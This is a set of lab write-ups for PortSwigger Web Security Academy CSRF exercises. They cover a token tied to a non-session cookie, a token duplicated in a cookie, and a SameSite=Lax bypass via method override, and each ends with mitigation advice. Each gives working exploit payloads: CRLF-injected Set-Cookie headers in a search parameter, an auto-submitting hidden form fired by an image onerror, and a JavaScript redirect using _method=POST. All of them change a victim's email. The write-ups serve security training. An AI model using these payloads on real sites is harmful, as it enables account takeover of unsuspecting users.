# 5th lab

#  Lab: CSRF where token is tied to non-session cookie
**Platform:** PortSwigger Web Security Academy
**Goal:** Use the exploit server to change the victim's email address.
**Vulnerability:** CSRF via Broken Anti-CSRF Implementation + HTTP Header (CRLF) Injection.

##  The Concept
The application uses a double-submit or decoupled token mechanism. It validates the hidden `csrf` token against a separate `csrfKey` cookie, rather than tying the CSRF token directly to the user's `session` cookie. 
Because the application does not verify if the `csrfKey` cookie actually belongs to the current authenticated user, an attacker can exploit this if they find a way to inject a known `csrfKey` cookie into the victim's browser. Once the known cookie is planted, the attacker can submit a CSRF form containing the matching `csrf` token, bypassing the protection.

## Prerequisites
* A valid `csrfKey` cookie and a matching `csrf` token (obtained by logging into your own attacker account).
* A vulnerability on the target site that allows setting arbitrary cookies in the victim's browser (e.g., CRLF injection in a search parameter).

##  Step-by-Step Exploitation

### Step 1: Harvest Valid Tokens
1. Log in to the application with standard credentials (`wiener:peter`).
2. Observe the HTTP traffic in Burp Suite.
3. Note the value of the `csrfKey` cookie from any authenticated request.
4. Intercept the submission of the "Update email" form and note the value of the hidden `csrf` parameter in the body.

### Step 2: Identify Cookie Injection (CRLF)
1. Use the search functionality on the site (e.g., `/?search=test`).
2. Observe the response: `Set-Cookie: LastSearchTerm=test`.
3. Verify CRLF injection by adding `%0d%0a` to the search term to append a new header:
   `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None`

### Step 3: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that first forces the victim's browser to execute the CRLF injection (planting the cookie) and then immediately submits the CSRF form.
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
       <input type="hidden" name="email" value="hacker@evil.com">
       <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
   </form>
   <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None)" onerror="document.forms[0].submit();">
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved!

**Key Takeaway / Mitigation**: Anti-CSRF tokens must be strictly cryptographically tied to the user's active session identifier (e.g., the session cookie) on the server side. Additionally, applications must sanitize all user inputs reflected in HTTP headers to prevent CRLF injectio


# 6th lab

#  Lab: CSRF where token is duplicated in cookie
**Platform:** PortSwigger Web Security Academy
**Goal:** Use the exploit server to change the victim's email address.
**Vulnerability:** CSRF via Flawed Double Submit Cookie Implementation + CRLF Injection.

##  The Concept
The application implements the "Double Submit Cookie" pattern for CSRF protection. It expects the CSRF token to be present in both a cookie and a hidden form field. 
However, the application only checks if the value in the cookie matches the value in the form parameter. It does not validate if the token is cryptographically valid or legally issued by the server. If an attacker can inject an arbitrary cookie into the victim's browser, they can simply invent a fake token, inject it via the cookie, and submit a CSRF payload containing the exact same fake token in the body.

##  Prerequisites
* A vulnerability that allows setting arbitrary cookies in the victim's browser (e.g., CRLF injection via a reflected search parameter).

##  Step-by-Step Exploitation

### Step 1: Identify Cookie Injection (CRLF)
1. Use the search functionality on the site.
2. Observe the HTTP response setting a tracking cookie: `Set-Cookie: LastSearchTerm=test`.
3. Verify CRLF injection by injecting a new line (`%0d%0a`) into the search term to append a malicious CSRF cookie:
   `/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None`

### Step 2: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that first forces the victim's browser to execute the CRLF injection (planting the `fake123` cookie) and then immediately submits the CSRF form with the matching `fake123` token.
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
       <input type="hidden" name="email" value="hacker@evil.com">
       <input type="hidden" name="csrf" value="fake123">
   </form>
   <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None)" onerror="document.forms[0].submit();">
   ```
3. click the store and then deliver the exploit to victim
4. The lab is successfully solved

**key Takeaway**:The Double Submit Cookie pattern is inherently fragile if any subdomain or functional endpoint on the architecture has a cookie injection vulnerability. Servers should implement strict validation, tying the CSRF token cryptographically to the server-side session, rather than blindly comparing two client-provided values. 


# 7th lab


# 🛡️ Lab: SameSite Lax bypass via method override
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass `SameSite=Lax` restrictions to change the victim's email address using an exploit server.
**Vulnerability:** CSRF via HTTP Method Overriding bypassing SameSite=Lax cookie restrictions.

## 🧠 The Concept
Modern browsers enforce `SameSite=Lax` by default on cookies. This prevents cookies from being sent in cross-site `POST` requests, effectively mitigating standard CSRF attacks. However, `Lax` allows cookies to be sent during top-level navigations using safe HTTP methods like `GET`.
Many web frameworks support **HTTP Method Overriding** (e.g., using a `_method` parameter) to simulate unsupported HTTP methods. If a backend framework allows simulating a `POST` request via a `GET` request parameter (like `?_method=POST`), an attacker can force the victim's browser to make a top-level `GET` navigation. The browser includes the `Lax` cookie because it's a `GET` request, and the backend processes it as a state-changing `POST` request, bypassing the CSRF protection.

## 🧰 Prerequisites
* A target endpoint that performs state-changing actions via `POST`.
* A backend framework that supports HTTP Method Overriding via URL parameters (e.g., `_method=POST`).

## 🛠️ Step-by-Step Exploitation

### Step 1: Verify Method Overriding
1. Capture a legitimate `POST` request to the target endpoint (e.g., `/my-account/change-email`).
2. Send the request to Burp Repeater.
3. Change the request method to `GET` and append the required parameters along with `_method=POST` to the URL.
   `GET /my-account/change-email?email=hacker@evil.com&_method=POST HTTP/2`
4. Send the request and verify if the action was successfully executed (e.g., receiving a `302 Found` redirecting back to the account page).

### Step 2: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft a simple HTML page with JavaScript that forces a top-level `GET` navigation to the vulnerable endpoint. This ensures the browser attaches the `SameSite=Lax` cookie.
   ```html
   <script>
       document.location = "[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=hacker@evil.com&_method=POST](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=hacker@evil.com&_method=POST)";
   </script>
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved! 🎉

**Key Takeaway / Mitigation**: Never allow state-changing operations to be executed via GET requests, even through framework features like Method Overriding. Backend systems should strictly enforce HTTP verbs and reject requests where the actual transport method (GET) contradicts the intended functional method (POST).